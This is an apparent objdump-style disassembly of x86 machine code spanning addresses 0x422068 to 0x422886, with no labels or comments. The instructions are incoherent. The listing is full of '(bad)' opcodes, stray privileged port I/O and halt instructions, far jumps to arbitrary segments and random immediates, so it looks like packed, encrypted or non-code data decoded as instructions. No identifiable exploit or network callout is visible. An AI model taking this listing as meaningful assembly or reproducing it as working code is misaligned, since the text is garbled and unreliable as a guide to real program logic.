  422068:	xchg   ebx,eax
  422069:	push   esi
  42206a:	mov    esp,0xd327cb42
  42206f:	push   ebp
  422070:	in     eax,dx
  422071:	push   edx
  422072:	add    edx,DWORD PTR [edi]
  422074:	dec    esp
  422075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422076:	sub    BYTE PTR [esp+esi*4],bh
  422079:	dec    esi
  42207a:	ds push edi
  42207c:	or     DWORD PTR [ecx-0x67],esi
  42207f:	(bad)  
  422080:	std    
  422081:	scas   al,BYTE PTR es:[edi]
  422082:	and    esp,DWORD PTR [ebp+0x6c]
  422085:	aas    
  422086:	popf   
  422087:	sub    al,BYTE PTR [ebx-0x76]
  42208a:	push   eax
  42208b:	and    al,0x8b
  42208d:	js     0x4220a1
  42208f:	jmp    0x661c7483
  422094:	mov    esp,0x8b610ec3
  422099:	ffreep st(1)
  42209b:	je     0x42204a
  42209d:	stos   DWORD PTR es:[edi],eax
  42209e:	push   edx
  42209f:	jb     0x422060
  4220a1:	pushf  
  4220a2:	ins    BYTE PTR es:[edi],dx
  4220a3:	call   0x25824aae
  4220a8:	push   ds
  4220a9:	ret    
  4220aa:	lods   al,BYTE PTR ds:[esi]
  4220ab:	inc    esp
  4220ac:	push   es
  4220ad:	retf   0x6860
  4220b0:	mov    edx,0xbf3f1a8b
  4220b5:	jnp    0x422071
  4220b7:	xchg   edi,eax
  4220b8:	inc    edi
  4220b9:	pop    edi
  4220ba:	add    al,al
  4220bc:	cmp    eax,DWORD PTR ds:0xafe369a8
  4220c2:	cmp    al,BYTE PTR ds:0xa0f25f78
  4220c8:	aaa    
  4220c9:	pop    ss
  4220ca:	rcr    DWORD PTR [ecx+0x1001b595],1
  4220d0:	add    BYTE PTR [eax-0x5c704494],dl
  4220d6:	cmp    BYTE PTR [eax+0x63d8c21b],0x86
  4220dd:	push   eax
  4220de:	and    dh,BYTE PTR [eax]
  4220e0:	xchg   esi,eax
  4220e1:	cmp    al,BYTE PTR [esi]
  4220e3:	mov    esi,0xf6c352b5
  4220e8:	int3   
  4220e9:	adc    al,0x65
  4220eb:	ret    
  4220ec:	ret    0x1922
  4220ef:	mov    eax,ds:0xeaca6144
  4220f4:	retf   0xdb16
  4220f7:	mov    dh,0x41
  4220f9:	retf   
  4220fa:	mov    ebx,0x26206ed2
  4220ff:	cs sbb eax,0xbb2d22fb
  422105:	stc    
  422106:	adc    ah,ah
  422108:	fisttp WORD PTR [esi+0x16]
  42210b:	lock push cs
  42210d:	mov    edx,0x7d1e120d
  422112:	cmp    eax,0xbf8248db
  422117:	and    al,0xfc
  422119:	ja     0x42213a
  42211b:	xchg   ebp,eax
  42211c:	jmp    0x2fef:0xe42c891c
  422123:	cmc    
  422124:	add    eax,0x86d92371
  422129:	in     al,0x1a
  42212b:	fmul   QWORD PTR [edi+0x37]
  42212e:	arpl   WORD PTR [edx-0x7d581b0e],dx
  422134:	retf   0xe3e
  422137:	mov    edi,0x9391552c
  42213c:	pop    eax
  42213d:	push   cs
  42213e:	mov    edx,0x36e4355
  422143:	push   es
  422144:	cmp    edi,0xabefbc05
  42214a:	stc    
  42214b:	sub    al,0xb1
  42214d:	mov    ah,0xa7
  42214f:	lock mov edx,0x97bfd96b
  422155:	push   ecx
  422156:	and    DWORD PTR [ebx+0x4],eax
  422159:	adc    eax,0x4087ec9f
  42215e:	loopne 0x42218e
  422160:	je     0x42214c
  422162:	sub    al,BYTE PTR [esi+0x60e6a660]
  422168:	push   0xdd2d4a7c
  42216d:	pop    esi
  42216e:	outs   dx,BYTE PTR ds:[esi]
  42216f:	dec    eax
  422170:	xchg   al,ch
  422172:	scas   al,BYTE PTR es:[edi]
  422173:	jmp    0xa234:0xa8385cc3
  42217a:	inc    ebx
  42217b:	rcl    BYTE PTR [ecx+0x5040a240],1
  422181:	sbb    BYTE PTR ds:0x91667715,ch
  422187:	xchg   esi,eax
  422188:	fisttp QWORD PTR [edi+0x3a3491f1]
  42218e:	xor    al,0x68
  422190:	jno    0x42219b
  422192:	dec    esp
  422193:	and    ebp,DWORD PTR [ebx+0x78]
  422196:	sub    edi,DWORD PTR [ebp-0x3]
  422199:	(bad)  
  42219a:	cld    
  42219b:	cld    
  42219c:	loop   0x42213f
  42219e:	popa   
  42219f:	enter  0x4bfe,0x13
  4221a3:	fs mov ebp,0x887c8106
  4221a9:	in     eax,dx
  4221aa:	lock (bad) 
  4221ac:	mov    eax,DWORD PTR [edi-0x39244a4f]
  4221b2:	aad    0xd
  4221b4:	neg    DWORD PTR [esi]
  4221b6:	jmp    0x4221a7
  4221b8:	popf   
  4221b9:	leave  
  4221ba:	rcr    DWORD PTR [ecx-0x6f0d8b7c],1
  4221c0:	rcr    DWORD PTR ds:0x34770790,0x7e
  4221c7:	pop    eax
  4221c8:	add    eax,esp
  4221ca:	pop    eax
  4221cb:	or     eax,DWORD PTR [esp+edi*4+0x4b]
  4221cf:	jl     0x4221c6
  4221d1:	fidivr DWORD PTR [esi-0x11]
  4221d4:	hlt    
  4221d5:	fbld   TBYTE PTR [esi+eiz*1+0x0]
  4221d9:	inc    edi
  4221da:	push   ss
  4221db:	jg     0x4221cd
  4221dd:	(bad)  
  4221de:	lahf   
  4221df:	(bad)  
  4221e0:	in     eax,0x70
  4221e2:	stos   DWORD PTR es:[edi],eax
  4221e3:	mov    eax,ss
  4221e5:	retf   0x1882
  4221e8:	push   esi
  4221e9:	fsub   DWORD PTR [ecx+0x4525b6c5]
  4221ef:	push   ss
  4221f0:	fnstsw WORD PTR fs:[esi-0x44c36f5]
  4221f7:	xor    al,0xd2
  4221f9:	jmp    0x6dc5:0xf124f82b
  422200:	pop    esi
  422201:	shl    DWORD PTR [eax+0x27],cl
  422204:	mov    WORD PTR [ebx+eax*2],es
  422207:	retf   0x7727
  42220a:	(bad)  
  42220c:	outs   dx,DWORD PTR ds:[esi]
  42220d:	mov    ds:0xd239fe0f,eax
  422212:	out    dx,eax
  422213:	and    edi,DWORD PTR [esi+eiz*8+0x7f641654]
  42221a:	push   edi
  42221b:	jb     0x422210
  42221d:	call   0xee8e:0xc22b0a2a
  422224:	jbe    0x4221ee
  422226:	es inc edx
  422228:	cs scas al,BYTE PTR es:[edi]
  42222a:	and    BYTE PTR [edx+0x539d293f],bh
  422230:	jns    0x422219
  422232:	jle    0x422288
  422234:	pop    esp
  422235:	ret    0x5449
  422238:	fidiv  DWORD PTR [edi+0x46]
  42223b:	ret    
  42223c:	cwde   
  42223d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42223e:	adc    eax,0x2e8a8b38
  422243:	pop    ebx
  422244:	ins    BYTE PTR es:[edi],dx
  422245:	xchg   ebp,eax
  422246:	dec    eax
  422247:	sbb    DWORD PTR [edi+0x3a421c98],edi
  42224d:	inc    edx
  42224e:	retf   
  42224f:	shr    BYTE PTR [edx-0x56],cl
  422252:	push   ebp
  422253:	jle    0x4221e7
  422255:	mov    ecx,0x15429466
  42225a:	loopne 0x422253
  42225c:	xor    eax,0x660997ab
  422261:	pushf  
  422262:	ror    BYTE PTR cs:[ecx*2+0x764b0c8],0x5e
  42226b:	shl    BYTE PTR cs:[ebp+eiz*1+0x16fbf890],0xc5
  422274:	fbld   TBYTE PTR [edx]
  422276:	std    
  422277:	ins    BYTE PTR es:[edi],dx
  422278:	adc    DWORD PTR [eax],ebp
  42227a:	push   cs
  42227b:	adc    eax,0x4cd5f117
  422280:	sbb    eax,0x6826e81f
  422285:	test   eax,0xe8358883
  42228a:	fbld   TBYTE PTR [esi]
  42228c:	repnz mov ah,0x20
  42228f:	inc    esp
  422290:	imul   esi,DWORD PTR [edi-0x1f82e0f3],0x10
  422297:	sub    eax,0x4d8a8bcb
  42229c:	cld    
  42229d:	and    bl,BYTE PTR [ebx]
  42229f:	(bad)  
  4222a0:	push   ds
  4222a1:	push   edx
  4222a2:	xchg   ebx,eax
  4222a3:	and    al,0xdb
  4222a5:	mov    eax,ds:0xa80c792e
  4222aa:	adc    BYTE PTR [esi],ah
  4222ac:	inc    ecx
  4222ad:	and    edx,DWORD PTR [ecx-0x2b426e37]
  4222b3:	dec    eax
  4222b4:	and    eax,0xd3b93843
  4222b9:	ret    0x2313
  4222bc:	push   cs
  4222bd:	mov    esi,0xd46898e1
  4222c2:	fisttp DWORD PTR [edx+0x7e22e449]
  4222c8:	mov    esp,0xa39b4297
  4222cd:	sub    esi,edx
  4222cf:	loope  0x4222f2
  4222d1:	cli    
  4222d2:	aad    0x8e
  4222d4:	nop    esi
  4222d7:	stc    
  4222d8:	mov    ch,BYTE PTR [eax+0xb]
  4222db:	xchg   DWORD PTR [edi],ecx
  4222dd:	ja     0x4222f3
  4222df:	dec    ebp
  4222e0:	cld    
  4222e1:	xor    ch,dh
  4222e3:	cmp    eax,0x9657a805
  4222e8:	cmp    eax,0xfac6a39c
  4222ed:	rol    BYTE PTR [esi+0xd00cf40],1
  4222f3:	mov    es,WORD PTR [ebx]
  4222f5:	dec    eax
  4222f6:	push   cs
  4222f7:	shl    DWORD PTR [edi],0x53
  4222fa:	loopne 0x4222ab
  4222fc:	sbb    eax,0xb217e30f
  422301:	mov    al,ds:0x25753d8a
  422306:	pop    ebp
  422307:	mov    dh,0x80
  422309:	xchg   ebp,eax
  42230a:	push   esp
  42230b:	dec    ebx
  42230c:	outs   dx,BYTE PTR ds:[esi]
  42230d:	sub    esp,DWORD PTR [edx+edi*2-0xb]
  422311:	inc    esi
  422312:	add    ebx,DWORD PTR [ecx]
  422314:	xor    ah,0x2f
  422317:	mov    eax,DWORD PTR [ebp+0x6c]
  42231a:	dec    ebp
  42231b:	inc    esi
  42231c:	pusha  
  42231d:	(bad)  ds:0x4b47e814
  422323:	or     al,0x86
  422325:	sub    eax,0xc5490aab
  42232a:	not    DWORD PTR [edi]
  42232c:	imul   edi,eax,0xc
  42232f:	sub    eax,0x9f6df3cd
  422334:	mov    ah,BYTE PTR [ebx-0x6c914141]
  42233a:	out    dx,al
  42233b:	test   DWORD PTR [edx+esi*2+0x49fb013f],0xf7eaad86
  422346:	adc    esi,DWORD PTR [edx]
  422348:	mov    bl,0x6f
  42234a:	add    eax,0x649458a2
  42234f:	cs push esp
  422351:	js     0x4222ec
  422353:	repnz xchg ebx,eax
  422355:	iret   
  422356:	or     esp,DWORD PTR [esi+ecx*4-0x6e]
  42235a:	xor    eax,0x2b2a2258
  42235f:	push   esi
  422360:	xchg   ebx,eax
  422361:	cs push ss
  422363:	rol    DWORD PTR [ecx-0x46a68593],0xac
  42236a:	fimul  DWORD PTR [ebx-0x19]
  42236d:	jb     0x422309
  42236f:	and    ecx,DWORD PTR [ebx]
  422371:	jae    0x4223d7
  422373:	test   BYTE PTR [edi-0x7de8059b],0x7c
  42237a:	dec    ebp
  42237b:	dec    esp
  42237c:	adc    bl,bl
  42237e:	mov    ebx,0xe29fd920
  422383:	pop    ecx
  422384:	cmp    BYTE PTR [ecx],0x2d
  422387:	jbe    0x422330
  422389:	dec    edx
  42238a:	dec    cx
  42238c:	aaa    
  42238d:	es call 0x8b6815ea
  422393:	fwait
  422394:	jmp    0x1128:0x68323364
  42239b:	or     al,BYTE PTR [edx]
  42239d:	sbb    BYTE PTR [esi-0x4b],dh
  4223a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223a1:	(bad)  
  4223a2:	and    ebp,DWORD PTR [esp+eiz*4-0x2f]
  4223a6:	xchg   ebx,eax
  4223a7:	sbb    al,0x76
  4223a9:	sub    ebp,esp
  4223ab:	jmp    0x42241a
  4223ad:	xchg   esp,eax
  4223ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223af:	aaa    
  4223b0:	sub    al,0xae
  4223b2:	pusha  
  4223b3:	out    0xf8,eax
  4223b5:	xor    BYTE PTR [esi],ch
  4223b7:	xchg   ebx,eax
  4223b8:	mov    esp,0x92c66413
  4223bd:	cmp    esp,DWORD PTR [ecx-0x5f]
  4223c0:	fisub  DWORD PTR [ebx+ebp*4]
  4223c3:	in     eax,dx
  4223c4:	loopne 0x422443
  4223c6:	cmc    
  4223c7:	cmp    al,0x46
  4223c9:	sub    BYTE PTR [ebx-0x2c24d821],al
  4223cf:	fwait
  4223d0:	mov    ebx,0xea014e0c
  4223d5:	lds    eax,FWORD PTR [ecx+0x7a]
  4223d8:	sar    BYTE PTR es:[ebx-0x6d9f062b],0xd1
  4223e0:	xchg   DWORD PTR ds:0x2409bc00,ebx
  4223e6:	mov    ebp,0xb93a2081
  4223eb:	(bad)  
  4223ec:	mov    BYTE PTR [edi],al
  4223ee:	add    BYTE PTR [esi+eax*1-0x3040c31a],al
  4223f5:	and    eax,0x3a598b49
  4223fa:	sub    ebp,esp
  4223fc:	ret    
  4223fd:	(bad)  
  4223ff:	loop   0x4223f1
  422401:	pop    ebx
  422402:	mov    ebp,0x2219b068
  422407:	out    0x46,al
  422409:	mov    ds:0x5d1b02f5,al
  42240e:	inc    eax
  42240f:	inc    eax
  422410:	fmul   QWORD PTR [ecx-0x4190f645]
  422416:	dec    esi
  422417:	pop    es
  422418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422419:	retf   
  42241a:	pop    esp
  42241b:	lods   al,BYTE PTR ds:[esi]
  42241c:	xor    al,0x80
  42241e:	test   BYTE PTR [ebx-0x4e],bh
  422421:	icebp  
  422422:	pop    esi
  422423:	inc    ebp
  422424:	lds    edi,FWORD PTR [ebp+0x4ab89694]
  42242a:	aam    0x94
  42242c:	hlt    
  42242d:	into   
  42242e:	sub    esi,edi
  422430:	ss inc ebx
  422432:	add    al,0x96
  422434:	mov    al,ds:0xbcc5e98f
  422439:	mov    ds:0xd900cd6f,al
  42243e:	sub    BYTE PTR [ebx],0xab
  422441:	in     al,0xc2
  422443:	fcomp  DWORD PTR [esi]
  422445:	or     eax,0xb4b1be1
  42244a:	mov    BYTE PTR [ebx-0x6b7780f],dh
  422450:	(bad)  
  422451:	nop
  422452:	add    dh,BYTE PTR [ebx]
  422454:	dec    esp
  422455:	push   eax
  422456:	(bad)  [edx+0x20]
  422459:	adc    DWORD PTR [edi],esi
  42245b:	inc    esp
  42245c:	push   esi
  42245d:	sbb    edi,esi
  42245f:	sub    DWORD PTR [edx+ecx*8+0x21],0x51
  422464:	push   0x2d15f121
  422469:	cli    
  42246a:	mov    BYTE PTR [esi],ah
  42246c:	(bad)  
  42246d:	and    eax,0x8fdd2419
  422472:	inc    esi
  422473:	lahf   
  422474:	sahf   
  422475:	retf   
  422476:	ds ja  0x42249c
  422479:	cld    
  42247a:	jl     0x42248f
  42247c:	test   DWORD PTR [edx],esp
  42247e:	dec    edi
  42247f:	dec    edx
  422480:	(bad)  
  422481:	cmc    
  422482:	dec    eax
  422483:	pushf  
  422484:	popf   
  422485:	stos   DWORD PTR es:[edi],eax
  422486:	ss jmp 0x8211:0xc7fd32c3
  42248e:	aam    0xf3
  422490:	ret    
  422491:	or     eax,0x8321b49c
  422496:	jge    0x42248c
  422498:	loope  0x422469
  42249a:	scas   al,BYTE PTR es:[edi]
  42249b:	xchg   edi,eax
  42249c:	icebp  
  42249d:	lods   eax,DWORD PTR ds:[esi]
  42249e:	jmp    0xcb84:0x5d9d9c66
  4224a5:	sti    
  4224a6:	in     al,dx
  4224a7:	loop   0x422498
  4224a9:	retf   
  4224aa:	mov    esp,0x1af9e9d7
  4224af:	mov    dh,0x52
  4224b1:	loope  0x4224b2
  4224b3:	inc    ebx
  4224b4:	data16 sub BYTE PTR [eax-0x29],bl
  4224b8:	daa    
  4224b9:	stc    
  4224ba:	jmp    0x569f:0xba1093b8
  4224c1:	xor    DWORD PTR [ebx],ebx
  4224c3:	or     eax,0x20c945e2
  4224c8:	mov    esi,0x14d5365d
  4224cd:	mov    al,ds:0x8462edd3
  4224d2:	xchg   esi,eax
  4224d3:	sub    BYTE PTR [edx],bl
  4224d5:	xor    edx,DWORD PTR [esi+ebp*1-0x6]
  4224d9:	push   es
  4224da:	std    
  4224db:	push   edi
  4224dc:	sbb    DWORD PTR [ebx],ecx
  4224de:	dec    eax
  4224df:	xchg   esp,eax
  4224e0:	imul   edi,DWORD PTR [eax-0x1506fd6a],0x64
  4224e7:	add    BYTE PTR [ebx],bh
  4224e9:	mov    ebx,0x3266c7e
  4224ee:	mov    eax,0x55c35626
  4224f3:	inc    edi
  4224f4:	pop    esp
  4224f5:	aad    0xe6
  4224f7:	adc    ah,BYTE PTR [eax]
  4224f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224fa:	sub    eax,0xd1d4e0c7
  4224ff:	and    esi,DWORD PTR [ebp+0x1d3bd48c]
  422505:	cwde   
  422506:	lds    ebp,FWORD PTR [edx-0x38]
  422509:	mov    bh,0x0
  42250b:	sub    BYTE PTR [edx+edx*1+0x579e1dfc],0x67
  422513:	and    bh,al
  422515:	push   cs
  422516:	frstor [ebx+0x33f12b2c]
  42251c:	pop    ds
  42251d:	lods   eax,DWORD PTR ds:[esi]
  42251e:	pop    esi
  42251f:	and    esp,DWORD PTR [eax+0x7f65e146]
  422525:	les    esp,FWORD PTR [ebp+0x49]
  422528:	ror    dl,0xf6
  42252b:	nop
  42252c:	cmp    ch,BYTE PTR [esi-0x70]
  42252f:	pushf  
  422530:	dec    ebp
  422532:	or     bl,bl
  422534:	popf   
  422535:	or     BYTE PTR [esi+0x59],0x91
  422539:	int    0x57
  42253b:	jb     0x42254f
  42253d:	ins    DWORD PTR es:[edi],dx
  42253e:	inc    edi
  42253f:	pusha  
  422540:	dec    esp
  422541:	adc    cl,BYTE PTR [eax]
  422543:	mov    edi,0xe5185046
  422548:	ja     0x422555
  42254a:	sub    eax,0x327ec95a
  42254f:	dec    edi
  422550:	sub    DWORD PTR [ebx-0x59f6fe50],eax
  422556:	xchg   ecx,eax
  422557:	sub    esi,eax
  422559:	lahf   
  42255a:	es loop 0x422515
  42255d:	retf   0x2a0d
  422560:	in     eax,0x2c
  422562:	retf   0xa58
  422565:	cdq    
  422566:	xchg   esi,eax
  422567:	in     al,dx
  422568:	sbb    esp,DWORD PTR [eax]
  42256a:	bnd jne 0x4225a7
  42256d:	xchg   ebp,eax
  42256e:	je     0x4225ef
  422570:	xor    al,0x40
  422572:	add    edx,ebx
  422574:	push   ebp
  422575:	cmp    edx,DWORD PTR [eax]
  422577:	jge    0x4225a8
  422579:	pop    edi
  42257a:	push   esi
  42257b:	or     al,0x76
  42257d:	dec    edi
  42257e:	pop    edi
  42257f:	add    DWORD PTR [edx-0x73fd7f7f],0x87e7ca51
  422589:	leave  
  42258a:	add    cl,BYTE PTR [esi]
  42258c:	mov    bl,0x9d
  42258e:	inc    ecx
  42258f:	sar    BYTE PTR [edx+0x4c37f29d],0xc0
  422596:	int    0xa5
  422598:	jecxz  0x4225fe
  42259a:	jne    0x422542
  42259c:	fiadd  DWORD PTR [ebx]
  42259e:	mov    cl,0xac
  4225a0:	(bad)  
  4225a1:	xor    dh,ah
  4225a3:	or     al,0x57
  4225a5:	popf   
  4225a6:	mov    dl,0xdc
  4225a8:	and    BYTE PTR [ebx-0x6b],dh
  4225ab:	pushf  
  4225ac:	xchg   DWORD PTR [ecx],ecx
  4225ae:	xor    eax,0x6b53e4eb
  4225b3:	xor    al,0x64
  4225b5:	jge    0x422601
  4225b7:	ror    BYTE PTR [eax],1
  4225b9:	pusha  
  4225ba:	aas    
  4225bb:	or     eax,0x2a571fc8
  4225c0:	sbb    BYTE PTR [ebp-0x116f8154],ah
  4225c6:	test   eax,0xab9b88a4
  4225cb:	adc    DWORD PTR [esp+ecx*8+0x20],eax
  4225cf:	or     eax,0xf65cf017
  4225d4:	sar    bh,1
  4225d6:	stos   BYTE PTR es:[edi],al
  4225d7:	push   ss
  4225d8:	jo     0x422657
  4225da:	mov    ecx,0x56bee8ad
  4225df:	jle    0x4225d0
  4225e1:	sub    al,0x8e
  4225e3:	push   cs
  4225e4:	add    eax,0xa43eeef6
  4225e9:	xchg   edi,eax
  4225ea:	or     al,0xf
  4225ec:	outs   dx,BYTE PTR ds:[esi]
  4225ed:	ins    DWORD PTR es:[edi],dx
  4225ee:	(bad)  
  4225ef:	pusha  
  4225f0:	pop    ecx
  4225f1:	sar    BYTE PTR [ebp+0x2],0x80
  4225f5:	aaa    
  4225f6:	push   ss
  4225f7:	jl     0x422629
  4225f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225fa:	lahf   
  4225fb:	out    dx,al
  4225fc:	je     0x4225ab
  4225fe:	cld    
  4225ff:	and    cl,BYTE PTR [ebx+ebx*2]
  422602:	cli    
  422603:	popf   
  422604:	pop    ds
  422605:	ret    0xe66a
  422608:	pop    ebp
  422609:	cmp    edx,eax
  42260b:	adc    DWORD PTR [ebx],edx
  42260d:	cmp    esp,DWORD PTR [edx-0x1b2980bc]
  422613:	or     BYTE PTR ds:0x28e19be2,dl
  422619:	sbb    ah,BYTE PTR [edi+ebx*8+0x2302b4b3]
  422620:	adc    al,0xf8
  422622:	cmp    eax,edx
  422624:	add    DWORD PTR ds:0x47671388,edx
  42262a:	sub    eax,0x40b57eb9
  42262f:	inc    esi
  422630:	pop    esp
  422631:	xor    DWORD PTR [ecx-0x130ceb8c],0xe3485384
  42263b:	scas   al,BYTE PTR es:[edi]
  42263c:	iret   
  42263d:	data16 mov al,0x44
  422640:	jg     0x422699
  422642:	bound  ecx,QWORD PTR [esp+edx*4]
  422645:	lahf   
  422646:	dec    eax
  422647:	lahf   
  422648:	dec    ebx
  422649:	and    dh,ch
  42264b:	push   cs
  42264c:	int3   
  42264d:	shl    edi,cl
  42264f:	mov    ds:0x9ee12faf,al
  422654:	pop    ecx
  422655:	pop    ds
  422656:	std    
  422657:	sub    eax,0x9b59447f
  42265c:	jge    0x422653
  42265e:	mov    ds:0xd0cdaf9a,al
  422663:	ret    0x5f9e
  422666:	sub    eax,0x78da5811
  42266b:	push   cs
  42266c:	add    eax,0x32ebcda7
  422671:	sbb    ebx,DWORD PTR fs:[edi+0x12a0991d]
  422678:	mov    bh,0x30
  42267a:	sbb    al,0x90
  42267c:	lock push ecx
  42267e:	or     esi,DWORD PTR [edi]
  422680:	shl    BYTE PTR [ebp-0x70],cl
  422683:	icebp  
  422684:	or     BYTE PTR [ebp+0x292fc428],dl
  42268a:	mov    eax,0x9895383a
  42268f:	cli    
  422690:	int3   
  422691:	or     eax,0x52bf9c31
  422696:	sar    BYTE PTR [eax],0xe9
  422699:	pop    ecx
  42269a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42269b:	jecxz  0x422660
  42269d:	out    dx,eax
  42269e:	stos   DWORD PTR es:[edi],eax
  42269f:	mov    al,0x52
  4226a1:	pop    es
  4226a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226a3:	dec    edi
  4226a4:	cli    
  4226a5:	lock push 0xa
  4226a8:	fcom   QWORD PTR [esi+0x62d10278]
  4226ae:	pop    es
  4226af:	push   cs
  4226b0:	test   eax,0x6e148d3a
  4226b5:	push   ds
  4226b6:	mov    fs,ebx
  4226b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226b9:	test   DWORD PTR [edx],esp
  4226bb:	jbe    0x42268f
  4226bd:	mov    bh,0x7f
  4226bf:	adc    eax,0x541dd07d
  4226c4:	out    0x2b,al
  4226c6:	sub    DWORD PTR [eax+0x37],eax
  4226c9:	(bad)  
  4226cc:	repz mov bh,0x69
  4226cf:	adc    ah,0x9f
  4226d2:	es pop edx
  4226d4:	mov    cl,dl
  4226d6:	cmp    bh,BYTE PTR [edi+esi*1-0x4666ee4b]
  4226dd:	or     al,cl
  4226df:	test   al,0x82
  4226e1:	call   ebx
  4226e3:	sbb    al,bl
  4226e5:	jle    0x4226a1
  4226e7:	xor    BYTE PTR [esi+0x2bb2420c],dh
  4226ed:	daa    
  4226ee:	jb     0x422721
  4226f0:	pop    eax
  4226f1:	mov    ecx,DWORD PTR ds:0xdeb2a5dc
  4226f7:	pop    eax
  4226f8:	mov    dh,dl
  4226fa:	pop    ebx
  4226fb:	jo     0x422766
  4226fd:	adc    DWORD PTR [ebx+0x4],eax
  422700:	test   eax,0xd3915a79
  422705:	fsub   DWORD PTR [esi-0xe487721]
  42270b:	cmc    
  42270c:	cmp    DWORD PTR [ebp-0x3e20bb3b],0xffffffd1
  422713:	add    eax,DWORD PTR [edi+0xf]
  422716:	not    DWORD PTR [eax+eiz*8]
  422719:	pop    edx
  42271a:	mov    dl,0xe1
  42271c:	(bad)  
  42271d:	jmp    0x7d0d:0x85969038
  422724:	sbb    DWORD PTR [eax-0x24f6ff8f],edx
  42272a:	pop    esi
  42272b:	fs sbb edi,esp
  42272e:	daa    
  42272f:	(bad)  [esp+esi*1-0x16]
  422733:	(bad)  
  422734:	xchg   ebp,eax
  422735:	int    0x20
  422737:	retf   0x444e
  42273a:	or     eax,0x1403097e
  42273f:	retf   
  422740:	xor    BYTE PTR [edi-0x1b],cl
  422743:	call   0xd054ff52
  422748:	add    eax,DWORD PTR [esi-0x5503dd5b]
  42274e:	xchg   edx,eax
  42274f:	cmp    BYTE PTR [ebp+0x123662ae],al
  422755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422756:	retf   
  422757:	push   0xc86c8c63
  42275c:	push   0x275f1d6
  422761:	cmp    BYTE PTR [eax-0x9a4c462],0xd1
  422768:	in     eax,0xe0
  42276a:	jg     0x42277e
  42276c:	dec    esp
  42276d:	adc    esp,ebx
  42276f:	mov    ecx,DWORD PTR [edi+0x49]
  422772:	mov    dl,0x58
  422774:	mul    bl
  422776:	repz imul ecx,DWORD PTR [eax+0x3a],0x417e18e9
  42277e:	jns    0x42271b
  422780:	mov    cl,0xa0
  422782:	and    DWORD PTR ss:[ebp+0x11],edi
  422786:	or     edi,DWORD PTR [ecx+0x4d]
  422789:	xchg   DWORD PTR [eax],esp
  42278b:	dec    esp
  42278c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42278d:	lock int3 
  42278f:	mov    ecx,0xfd96bc39
  422794:	jg     0x422736
  422796:	scas   eax,DWORD PTR es:[edi]
  422797:	pusha  
  422798:	jb     0x422736
  42279a:	sub    ecx,DWORD PTR [ecx]
  42279c:	popa   
  42279d:	push   ebp
  42279e:	and    al,0x28
  4227a0:	lock out 0x8d,al
  4227a3:	dec    ecx
  4227a4:	lods   al,BYTE PTR ds:[esi]
  4227a5:	push   esp
  4227a6:	fistp  DWORD PTR [eax-0x5954e66b]
  4227ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227ad:	jl     0x4227a9
  4227af:	add    al,0x1
  4227b1:	dec    ecx
  4227b2:	(bad)  
  4227b3:	outs   dx,BYTE PTR ds:[esi]
  4227b4:	fs call 0x84df:0x240c6258
  4227bc:	in     al,dx
  4227bd:	adc    bl,ch
  4227bf:	pop    esi
  4227c0:	sub    al,0xd1
  4227c2:	jg     0x4227fb
  4227c4:	leave  
  4227c5:	adc    al,0xa5
  4227c7:	push   cs
  4227c8:	ds push ebp
  4227ca:	das    
  4227cb:	mov    al,0xcc
  4227cd:	sbb    DWORD PTR [edx-0x78fba80],eax
  4227d3:	and    BYTE PTR [ecx+0x18b1e7ee],al
  4227d9:	jbe    0x422841
  4227db:	jmp    0x132ed9e2
  4227e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227e1:	xor    al,0x4e
  4227e3:	(bad)  
  4227e4:	and    edi,DWORD PTR [edx+0x73]
  4227e7:	out    dx,al
  4227e8:	shl    BYTE PTR [edx],cl
  4227ea:	sahf   
  4227eb:	fild   QWORD PTR [edx+0x6f7ab6e3]
  4227f1:	cmp    eax,0xf280c2c0
  4227f6:	imul   eax,DWORD PTR [ebp-0x21],0x46
  4227fa:	push   esi
  4227fb:	jno    0x422788
  4227fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227fe:	pop    ecx
  4227ff:	ret    
  422800:	rcr    ebx,1
  422802:	call   0x2255:0xfa33777b
  422809:	add    eax,0xbc0017ef
  42280e:	retf   0x1def
  422811:	cmc    
  422812:	mul    DWORD PTR [esi]
  422814:	not    DWORD PTR [eax-0x6716ffe7]
  42281a:	xchg   edi,eax
  42281b:	idiv   DWORD PTR [edi-0x59]
  42281e:	or     cl,ch
  422820:	dec    edx
  422821:	fisubr WORD PTR [ecx]
  422823:	sub    DWORD PTR [esi+0x43dd476c],ebx
  422829:	nop
  42282a:	cmp    cl,bl
  42282c:	jae    0x4227b9
  42282e:	rcr    BYTE PTR [esi],0x9f
  422831:	js     0x422840
  422833:	mov    eax,ds:0xd9418beb
  422838:	and    BYTE PTR [ebx],al
  42283a:	sub    dh,BYTE PTR [esp+edx*2]
  42283d:	nop
  42283e:	imul   ecx,DWORD PTR [eax+0x77e71c1d],0x3f
  422845:	jecxz  0x4227ce
  422847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422848:	mov    cl,0x71
  42284a:	lahf   
  42284b:	enter  0xdf06,0x65
  42284f:	mov    ecx,0x595d13aa
  422854:	add    al,0x23
  422856:	pop    ebx
  422857:	push   edx
  422858:	rol    DWORD PTR [edx+0x325428e7],1
  42285e:	ret    
  42285f:	jo     0x422801
  422861:	popa   
  422862:	and    edi,eax
  422864:	dec    esi
  422865:	pop    esp
  422866:	loopne 0x42285d
  422868:	mov    ds:0xcb9600e9,eax
  42286d:	xchg   esi,eax
  42286e:	pop    edx
  42286f:	adc    eax,0xec83016
  422874:	int3   
  422875:	cs ss and al,0xd3
  422879:	lock fstp DWORD PTR ds:0xc55aadbc
  422880:	test   esp,esi
  422882:	xor    DWORD PTR [edi+0x11],esi
  422885:	ins    BYTE PTR es:[edi],dx
  422886:	push   0xffffffb4
